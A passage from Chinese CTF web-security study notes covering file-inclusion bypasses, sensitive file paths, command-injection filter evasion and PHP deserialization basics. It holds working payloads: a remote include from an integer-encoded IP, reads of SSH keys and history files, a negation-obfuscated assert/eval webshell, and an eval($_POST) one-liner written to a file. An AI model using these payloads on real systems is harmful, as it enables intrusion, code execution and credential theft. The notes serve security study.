<p>在文件后面加<code>.</code> 如： </p>
<blockquote>
<p>info.php………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………….html</p>
<p><code>.</code>超过256个就行，后面多出来的<code>...........................................html</code>不会被识别到</p>
</blockquote>
<h4 id="2）-截断后缀"><a href="#2）-截断后缀" class="headerlink" title="2）? 截断后缀"></a>2）? 截断后缀</h4><p>往往文件包含中会出现</p>
<blockquote>
<p><code>(&quot;$file&quot;.&quot;.html&quot;)</code><br>这里以html为例子，这样我们输入的文件名称参数后面终会跟上.html后缀，从而导致文件包含失败</p>
<p>要截断后缀，只需要在末尾添加 <code>?</code> 即可，这样后缀就会变成 URL 的参数</p>
</blockquote>
<h4 id="3）-点被过滤，网址-IP无法输入"><a href="#3）-点被过滤，网址-IP无法输入" class="headerlink" title="3）.点被过滤，网址&#x2F;IP无法输入"></a>3）<code>.</code>点被过滤，网址&#x2F;IP无法输入</h4><p>ip转长整型,里面有一句话木马,需要vps</p>
<blockquote>
<p><a href="https://www.bejson.com/convert/ip2int/">https://www.bejson.com/convert/ip2int/</a></p>
</blockquote>
<p>如将IP地址219.239.110.138转换为数字：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">219</span> * <span class="number">256</span>^<span class="number">3</span> + <span class="number">239</span> * <span class="number">256</span>^<span class="number">2</span> + <span class="number">110</span> * <span class="number">256</span>^<span class="number">1</span> + <span class="number">138</span> * <span class="number">256</span>^<span class="number">0</span> = <span class="number">3689901706</span></span><br></pre></td></tr></table></figure>

<p>因此，219.239.110.138的数字地址为3689901706。</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">include <span class="string">&quot;http://3689901706&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h4 id="4）-被过滤"><a href="#4）-被过滤" class="headerlink" title="4）;被过滤"></a>4）;被过滤</h4><p>?&gt;闭合代码</p>
<p>因为?&gt;可以代替php代码中最后一个分号的作用</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803165104978.png"><img src="/Web-study/image-20230803165104978.png" alt="image-20230803165104978"></a></p>
<h4 id="5）强制加后缀"><a href="#5）强制加后缀" class="headerlink" title="5）强制加后缀"></a>5）强制加后缀</h4><figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">如 include($cmd.&quot;.php&quot;)</span></span><br><span class="line"><span class="language-xml">$cmd=data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>()<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">// 后面再拼接上.php的时候，由于php语句已经闭合，所以起不了什么作用</span></span><br></pre></td></tr></table></figure>

<h4 id="6）路径过滤"><a href="#6）路径过滤" class="headerlink" title="6）路径过滤"></a>6）路径过滤</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">如replace(<span class="string">&#x27;./&#x27;</span>,<span class="string">&#x27;&#x27;</span>) ==&gt;</span><br><span class="line">可以用 ...<span class="regexp">//</span>...<span class="regexp">//</span>...<span class="regexp">//</span>...<span class="regexp">//</span>...<span class="regexp">//</span>flag</span><br></pre></td></tr></table></figure>

<h3 id="4-敏感文件路径"><a href="#4-敏感文件路径" class="headerlink" title="4.敏感文件路径"></a>4.敏感文件路径</h3><h5 id="读取网站配置文件"><a href="#读取网站配置文件" class="headerlink" title="读取网站配置文件"></a>读取网站配置文件</h5><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">dedecms 数据库配置文件 data/common<span class="selector-class">.inc</span><span class="selector-class">.php</span>,</span><br><span class="line">discuz 全局配置文件 config/config_global<span class="selector-class">.php</span>,</span><br><span class="line">phpcms 配置文件 caches/configs/database<span class="selector-class">.php</span></span><br><span class="line">phpwind 配置文件 conf/database<span class="selector-class">.php</span></span><br><span class="line">wordpress 配置文件 wp-config.php</span><br></pre></td></tr></table></figure>

<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">C:</span>/boot.ini<span class="comment">//查看系统版本</span></span><br><span class="line"><span class="symbol">C:</span>/Windows/System32<span class="keyword">/inetsrv/</span>MetaBase.xml<span class="comment">//IIS 配置文件</span></span><br><span class="line"><span class="symbol">C:</span>/Windows<span class="keyword">/repairsam/</span>/存储系统初次安装的密码</span><br><span class="line"><span class="symbol">C:</span>/Program Files<span class="keyword">/mysql/</span>my.ini<span class="comment">//Mysql 配置</span></span><br><span class="line"><span class="symbol">C:</span>/Program Files<span class="keyword">/mysql/</span>data<span class="keyword">/mysql/</span>user.MYD<span class="comment">//Mysql   root</span></span><br><span class="line"><span class="symbol">C:</span>/Windows/php.ini<span class="comment">//php 配置信息</span></span><br><span class="line"><span class="symbol">C:</span>/Windows/my.ini<span class="comment">//Mysql 配置信息</span></span><br></pre></td></tr></table></figure>

<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/proc/</span>self<span class="regexp">/cwd/</span> <span class="comment">#指向当前目录</span></span><br><span class="line"><span class="regexp">/proc/</span>self/root <span class="comment">#指向根目录</span></span><br><span class="line"><span class="regexp">/proc/m</span>aps    <span class="comment">#记录一些调用的拓展或者自定义的so文件</span></span><br><span class="line"><span class="regexp">/proc/</span>self/environ <span class="comment">#环境变量</span></span><br><span class="line"><span class="regexp">/proc/</span>environ  <span class="comment">#环境变量</span></span><br><span class="line"><span class="regexp">/proc/</span>comm    <span class="comment">#当前进程运行的程序</span></span><br><span class="line"><span class="regexp">/proc/</span>cmdline <span class="comment">#程序运行的绝对路径</span></span><br><span class="line"><span class="regexp">/proc/</span>cpuset <span class="comment">#docker环境可以看 machine ID</span></span><br><span class="line"><span class="regexp">/proc/</span>cgroup <span class="comment">#docker环境全是 machine ID 不常用</span></span><br><span class="line"><span class="regexp">/root/</span>.ssh/authorized_keys</span><br><span class="line"><span class="regexp">/root/</span>.ssh/id_rsa</span><br><span class="line"><span class="regexp">/root/</span>.ssh/id_ras.keystore</span><br><span class="line"><span class="regexp">/root/</span>.ssh/known_hosts</span><br><span class="line"><span class="regexp">/root/</span>.bash_history</span><br><span class="line"><span class="regexp">/root/</span>.mysql_history</span><br></pre></td></tr></table></figure>

<p>CTF中flag的路径常见读取，爆破测试字典</p>
<blockquote>
<p><a href="https://github.com/ev0A/ArbitraryFileReadList/">ev0A&#x2F;ArbitraryFileReadList: CTF中任意文件读取的fuzz列表 (Arbitrary file read fuzz list in CTF) (github.com)</a></p>
</blockquote>
<h2 id="八、逻辑漏洞"><a href="#八、逻辑漏洞" class="headerlink" title="八、逻辑漏洞"></a>八、逻辑漏洞</h2><blockquote>
<p>一般在支付购买处代码，对数据处理出现逻辑错误，对用户输入的数据没有进行严格审查，导致逻辑漏洞，使得用户获取不属于他的权限或者信息内容</p>
</blockquote>
<h2 id="九、命令执行"><a href="#九、命令执行" class="headerlink" title="九、命令执行"></a>九、命令执行</h2><h3 id="1-有关命令执行的知识（windows-或-linux-下）"><a href="#1-有关命令执行的知识（windows-或-linux-下）" class="headerlink" title="1.有关命令执行的知识（windows 或 linux 下）:"></a>1.有关命令执行的知识（windows 或 linux 下）:</h3><blockquote>
<p><code>1）command1 ; command2 用;隔开表示为多个命令，命令按照从左到右的顺序执行，彼此无关联，所有的命令都会执行。先执行 command1 后执行 command2</code></p>
<p><code>2）command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2</code></p>
<p><code>3）command1 | command2 将两个命令分开，左边命令的输出作为右边命令的输入，只执行 command2</code></p>
<p><code>4）command1 &amp; command2 &amp;表示任务后台执行，与nohup命令功能差不多，先执行 command2 后执行 command1</code></p>
<p><code>5）command1 || command2 先执行 command1，如果为假，再执行 command2</code></p>
<p><code>命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符）</code></p>
</blockquote>
<p>eg:</p>
<p><code>find  / -name &quot;flag* &quot;</code><br>在当前目录及其子目录下查找文件名中包含<code>flag</code>的文件<br><code>find  / -name &quot; *.txt&quot;</code><br>在当前目录及其子目录下查找后缀为<code>txt</code>的文件</p>
<h3 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><h4 id="1-过滤cat"><a href="#1-过滤cat" class="headerlink" title="1.过滤cat"></a>1.过滤cat</h4><blockquote>
<p><code>more，less，head，tac</code>都可以对文本进行读取</p>
</blockquote>
<h4 id="2-过滤空格"><a href="#2-过滤空格" class="headerlink" title="2.过滤空格"></a>2.过滤空格</h4><blockquote>
<p><code>IFS$9、%09、&lt;、&gt;、&lt;&gt;、&#123;,&#125;、%20、$&#123;IFS&#125;、$&#123;IFS&#125;</code>来代替空格</p>
</blockquote>
<blockquote>
<p><code>&lt;,&gt;</code>是把内容导向某个地方，可以是文件，也可以是命令</p>
<p>如<code>cat&lt;flag.php</code>就是相当于，把flag.php内容用cat命令显示出来</p>
<p><code>%09</code>是tab键，可以补全内容</p>
<p>比如过滤了flag，但是需要访问<code>flag233.php</code></p>
<p>那么就可以<code>cat %09*233.php</code>，就可以了</p>
</blockquote>
<h4 id="3-过滤目录分隔符"><a href="#3-过滤目录分隔符" class="headerlink" title="3.过滤目录分隔符"></a>3.过滤目录分隔符</h4><blockquote>
<p>也就是&#x2F;不能用了，不能直接查看文件目录</p>
<p><code>cat /flag_is_here/flag_9012297169124.php</code></p>
<p>可以<strong>利用分号使两个命令同时进行</strong>也就是</p>
<p><code>127.0.0.1;cd flag_is_here;cat flag_9012297169124.php</code></p>
</blockquote>
<h4 id="4-过滤运算符"><a href="#4-过滤运算符" class="headerlink" title="4.过滤运算符"></a>4.过滤运算符</h4><p>可以用<code>;</code>代替管道运算符</p>
<h4 id="5-绕过正则匹配"><a href="#5-绕过正则匹配" class="headerlink" title="5.绕过正则匹配"></a>5.绕过正则匹配</h4><p>比如</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>)</span></span>)</span><br></pre></td></tr></table></figure>

<p><code>所有大小写字母和数字都被正则匹配过滤</code></p>
<p>这里就需要</p>
<h5 id="法1：取反绕过："><a href="#法1：取反绕过：" class="headerlink" title="法1：取反绕过："></a>法1：取反绕过：</h5><p><u><strong>取反</strong>就是将数字转化为二进制,再把二进制中的1变成0,0变成1</u></p>
<p><code>~</code>是取反符号，</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">echo urlencode(~<span class="string">&#x27;eval($_REQUEST[8])&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">%9E%8C%8C%9A%8D%8B</span><br><span class="line">%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6</span><br></pre></td></tr></table></figure>

<blockquote>
<p>php断言：assert — 检查一个断言是否为 false，如果参数是字符串，它将会被 assert() 当做 PHP 代码来执行</p>
</blockquote>
<p>然后再赋值</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">?code<span class="operator">=</span>(~<span class="variable">%9</span>E<span class="variable">%8</span>C<span class="variable">%8</span>C<span class="variable">%9</span>A<span class="variable">%8</span>D<span class="variable">%8</span>B)(~<span class="variable">%9</span>A<span class="variable">%89</span><span class="variable">%9</span>E<span class="variable">%93</span><span class="variable">%D7</span><span class="variable">%DB</span><span class="variable">%A0</span><span class="variable">%AD</span><span class="variable">%BA</span><span class="variable">%AE</span><span class="variable">%AA</span><span class="variable">%BA</span><span class="variable">%AC</span><span class="variable">%AB</span><span class="variable">%A4</span><span class="variable">%C7</span><span class="variable">%A2</span><span class="variable">%D6</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意后面要有<code>;</code>代表php代码结束<br>这里~是取反，之前urlencode里取反了一次，赋值时再取反一次，相当于没有取反<br>等同于</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">?<span class="meta">code</span>=(<span class="meta">assert</span>)(eval($_REQUEST[<span class="number">8</span>]))</span><br></pre></td></tr></table></figure>

<p>(assert)因为是assert是函数，被当作函数执行，于是因为<code>断言(eval($_REQUEST[8]))</code>，所以把<code>eval($_REQUEST[8])</code>当作<code>php</code>执行，于是就可以拿到<code>shell</code>了</p>
</blockquote>
<p>蚁剑连接</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>//url?code<span class="operator">=</span>(~<span class="variable">%9</span>E<span class="variable">%8</span>C<span class="variable">%8</span>C<span class="variable">%9</span>A<span class="variable">%8</span>D<span class="variable">%8</span>B)(~<span class="variable">%9</span>A<span class="variable">%89</span><span class="variable">%9</span>E<span class="variable">%93</span><span class="variable">%D7</span><span class="variable">%DB</span><span class="variable">%A0</span><span class="variable">%AD</span><span class="variable">%BA</span><span class="variable">%AE</span><span class="variable">%AA</span><span class="variable">%BA</span><span class="variable">%AC</span><span class="variable">%AB</span><span class="variable">%A4</span><span class="variable">%C7</span><span class="variable">%A2</span><span class="variable">%D6</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h5 id="法2：异或绕过"><a href="#法2：异或绕过" class="headerlink" title="法2：异或绕过:"></a>法2：异或绕过:</h5><p>在PHP中两个字符串异或之后，得到的还是一个字符串。<br> 例如：异或 <code>?</code> 和 <code>~</code> 之后得到的是 <code>A</code></p>
<blockquote>
<p>字符：?         ASCII码：63           二进制：  00‭11 1111‬<br>字符：~         ASCII码：126          二进制：  0111 1110‬<br>异或规则：<br>1   XOR   0   &#x3D;   1<br>0   XOR   1   &#x3D;   1<br>0   XOR   0   &#x3D;   0<br>1   XOR   1   &#x3D;   0<br>上述两个字符异或得到 二进制：  0100 0001<br>该二进制的十进制也就是：65<br>对应的ASCII码是：A</p>
</blockquote>
<p>本题preg_replace()过滤了<code>所有英文字母和数字</code>，但是<em>ASCII码中还有很多<code>字母数字之外的字符</code>，利用这些字符进行异或可以得到我们想要的字符</em></p>
<blockquote>
<p>PS：取ASCII表种非字母数字的其他字符，要注意有些字符可能会影响整个语句执行，所以要去掉如：反引号，单引号</p>
</blockquote>
<h5 id="法3：反斜杠-转义绕过"><a href="#法3：反斜杠-转义绕过" class="headerlink" title="法3：反斜杠\转义绕过"></a>法3：反斜杠\转义绕过</h5><p>对于</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(preg_match(<span class="string">&quot;/ls|tee|head|wegt|nl|vi|vim|file|sh|dir|cat|more|less|tar|mv|cp|wegt|php|sort|echo|bash|curl|uniq|rev|\&quot;|\&#x27;| |\/|&lt;|&gt;|\\|/i&quot;</span>, <span class="variable">$ip</span>,<span class="variable">$match</span>)</span></span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在这个正则匹配中并没有过滤反斜杠<code>\</code></p>
<p>所以虽然我们执行<code>ls</code>之类会被过滤，但是执行<code>l\s</code>时，会绕过<code>ls</code>的匹配，但是仍然能实现<code>ls</code>的功能</p>
<p>对于文件名比如<code>php</code>过滤，也可以用反义字符<code>p\ph</code>，同样也可以绕过</p>
</blockquote>
<h4 id="6-绕过长度限制"><a href="#6-绕过长度限制" class="headerlink" title="6.绕过长度限制"></a>6.绕过长度限制</h4><p><code>&gt;</code>和<code>&gt;&gt;</code>两个符号的使用</p>
<blockquote>
<p>使用<code>&gt;</code>命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建文件再存入</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220926223728694.png"><img src="/Web-study/image-20220926223728694.png" alt="image-20220926223728694"></a></p>
<blockquote>
<p><code>&gt;&gt;</code>符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220926223749908.png"><img src="/Web-study/image-20220926223749908.png" alt="image-20220926223749908"></a></p>
<h4 id="2-常用命令"><a href="#2-常用命令" class="headerlink" title="2.常用命令"></a>2.常用命令</h4><blockquote>
<p>ls</p>
<p>cat</p>
<p>touch</p>
<p>#创建文件，一般创建脚本文件，</p>
<p>比如<code>touch haha.php</code></p>
<p>然后再执行</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;&gt;&gt;haha.php</span></span><br></pre></td></tr></table></figure>

<p>，在脚本文件里写一串一句话木马</p>
<p><strong>但是注意因为有$，后面的看可能会被当做变量，所以可以加上反斜杠\转义</strong></p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(\<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;&gt;&gt;haha.php</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="十、暴力破解"><a href="#十、暴力破解" class="headerlink" title="十、暴力破解"></a>十、暴力破解</h2><blockquote>
<p>一把搜哈就完事（奸笑）</p>
</blockquote>
<h2 id="十一、反序列化漏洞（PHP）"><a href="#十一、反序列化漏洞（PHP）" class="headerlink" title="十一、反序列化漏洞（PHP）"></a>十一、反序列化漏洞（PHP）</h2><blockquote>
<p><a href="https://blog.csdn.net/Onlyone_1314/article/details/121461984?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-121461984-blog-108803410.pc_relevant_downloadblacklistv1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-121461984-blog-108803410.pc_relevant_downloadblacklistv1&utm_relevant_index=2">原文链接1</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/377676274">原文链接2</a></p>
</blockquote>
<h3 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h3><blockquote>
<p><strong>序列化</strong>(Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。</p>
</blockquote>
<h3 id="php的序列化和反序列化"><a href="#php的序列化和反序列化" class="headerlink" title="php的序列化和反序列化"></a>php的序列化和反序列化</h3><blockquote>
<p>概念：<code>php的序列化将对象转化为了字符串，包含了对象的所有数据信息，</code><br><code>反序列化时再根据这些信息还原对象。</code></p>
<p><u>php的序列化和反序列化由</u></p>
<p><u>serialize()和unserialize()</u></p>
<p>这两个函数来完成。</p>
<p>serialize()完成序列化的操作，将传入的值转换为序列化后的字符串；</p>
<p>而unserialize()完成反序列化的操作，将字符串转换成原来的变量。</p>
<p><code>serialize(mixed $value): string</code><br>serialize()返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方：</p>
<p>O::””::{&lt;field name 1&gt;&lt;field value 1&gt;…}</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230502195813375.png"><img src="/Web-study/image-20230502195813375.png" alt="image-20230502195813375"></a></p>
<p>  </p>
<blockquote>
<p>当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 wakeup() 成员函数。<br><code>unserialize(string $str): mixed</code><br>  unserialize()对单一的已序列化的变量进行操作，将其转换回 PHP 的值。<br>若被反序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 wakeup() 成员函数（如果存在的话）。</p>
</blockquote>
<p>注意：</p>
<p><code>private声明</code></p>
<blockquote>
<p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。</p>
<p>因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度</p>
<p>%00也就是空字符，无法复制，只能自己修改二进制，或者自己加上</p>
</blockquote>
<h3 id="php魔术方法"><a href="#php魔术方法" class="headerlink" title="php魔术方法"></a>php魔术方法</h3><blockquote>
<p><a href="https://blog.csdn.net/qq_45552960/article/details/102664372">原文链接</a></p>
</blockquote>
<p> PHP中以两个下划线开头的方法，</p>
<blockquote>
<p><code>__construct(),__destruct(),__call(),__callStatic(),__get(),__set(),__isset(),__unset(),__sleep(),__wakeup(),__toString(),__set_state(),__clone()，__autoload()</code></p>
</blockquote>
<p>被称为”魔术方法”（Magic methods）。这些方法在一定条件下有特殊的功能，在<code>命名自己的类方法时不能使用这些方法名</code>，除非是想使用其魔术功能</p>
<p>与序列化和反序列化的魔术方法主要是：</p>
<blockquote>
<p>__construct()	&#x2F;&#x2F;当一个对象创建时被调用</p>
<p>__destruct() 	&#x2F;&#x2F;对象被销毁时触发</p>
<p>__wakeup() 	&#x2F;&#x2F;使用unserialize时触发</p>
<p>__sleep() 	&#x2F;&#x2F;使用serialize时触发</p>
<p>__toString() 	&#x2F;&#x2F;把类当做字符串时触发<br>1.{因为echo无法输出对象，所以可以利用该魔法方法，在直接输出对象引用的时候，就不会产生错误，而是自动调用了”__toString()”方法, 输出“__toString()”方法中返回的字符，所以“__toString()”方法一定要有个返回值(return 语句)}<br>2.当然除了当作字符串打印时会触发，当把实例化的类当作字符串进行preg_match匹配时，也会触发</p>
<p>__get() 	&#x2F;&#x2F;用于从不可访问的属性读取数据</p>
<p>__set() 	&#x2F;&#x2F;用于将数据写入不可访问的属性</p>
<p>__invoke()  &#x2F;&#x2F;当脚本尝试将对象调用为函数时触发</p>
<p>__call()     &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</p>
<p>__callStatic()  &#x2F;&#x2F;在静态上下文中调用不可访问的属性</p>
<p>__isset()   &#x2F;&#x2F;当对不可访问属性调用isset()或empty()时调用</p>
<p>__set_state()   &#x2F;&#x2F;调用var_export()导出类时，此静态方法会被调用。</p>
<p>__clone()  &#x2F;&#x2F;当对象复制完成时调用</p>
<p>__autoload()   &#x2F;&#x2F;尝试加载未定义的类</p>
<p>__debugInfo()   &#x2F;&#x2F;打印所需调试信息</p>
</blockquote>
<p>·注意：</p>
<blockquote>
<p>PHP 将所有以 <code>__</code>（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 <code>__</code> 为前缀。</p>
<p><strong>·sleep() 和 wakeup()</strong></p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">public __sleep ( void )<span class="keyword"> :</span><span class="built_in"> array</span></span><br><span class="line"><span class="built_in"></span>__wakeup ( void )<span class="keyword"> :</span> void</span><br></pre></td></tr></table></figure>

<p><code>serialize()</code> 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 <code>NULL</code> 被序列化，并产生一个 <code>E_NOTICE</code> 级别的错误。</p>
<p><strong>Note</strong></p>
<blockquote>
<ol>
<li>__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。</li>
<li>__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</li>
<li>与之相反，unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</li>
<li>__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</li>
</ol>
</blockquote>
<p><strong>访问控制</strong></p>
<blockquote>
<ul>
<li>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。</li>
<li>public（公有）：公有的类成员可以在任何地方被访问。</li>
<li>protected（受保护）：受保护的类成员则可以被其自身以及其子类和父类访问。</li>
<li>private（私有）：私有的类成员则只能被其定义所在的类访问。</li>
</ul>
</blockquote>
<p><code>unserialize() 将已序列化的字符串还原回 PHP 的值。</code><br><code>序列化请使用 serialize() 函数。</code></p>
<p><strong>语法</strong></p>
<blockquote>
<p><code>unserialize(str)</code></p>
<p>参数    描述<br><code>str</code>    必需。一个序列化字符串。<br>__wakeup()是用在反序列化操作中。unserialize()会检查存在一个__wakeup()方法。如果存在，则先会调用__wakeup()方法。</p>
</blockquote>
</blockquote>
<hr>
<h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><p><code>__construct()</code>被称为构造方法，也就是在创造一个对象时候，首先会去执行的一个方法。但是在<code>序列化</code>和<code>反序列化</code>过程是不会触发的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;F0rmat&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct test</span><br></pre></td></tr></table></figure>

<p>可以看到，创建对象的时候触发了一次，在后面的序列化和反序列化过程中都没有触发。</p>
<hr>
<h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><p>在到某个对象的所有引用都被删除或者当对象被显式销毁时执行的魔术方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct test&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__destruct test</span><br><span class="line">__destruct test</span><br></pre></td></tr></table></figure>

<p>可以看到执行了两次<code>__destruct()</code>，因为一个就是实例化的时候创建的对象，另一个就是反序列化后生成的对象。</p>
<hr>
<h4 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h4><p>在对象中调用一个不可访问方法时，<code>__call()</code> 会被调用。也就是说你调用了一个对象中不存在的方法，就会触发。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;<span class="title function_ invoke__">abc</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">abc,a</span><br></pre></td></tr></table></figure>

<p>可以看到**__call**需要定义两个参数，一个是表示调用的函数名，一般开发会在这里报错写xxx不存在这个函数，第二个参数是传入的数组，这里只传入了一个a。</p>
<hr>
<h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic"></a>__callStatic</h4><p>在静态上下文中调用一个不可访问方法时，<code>__callStatic()</code> 会被调用。</p>
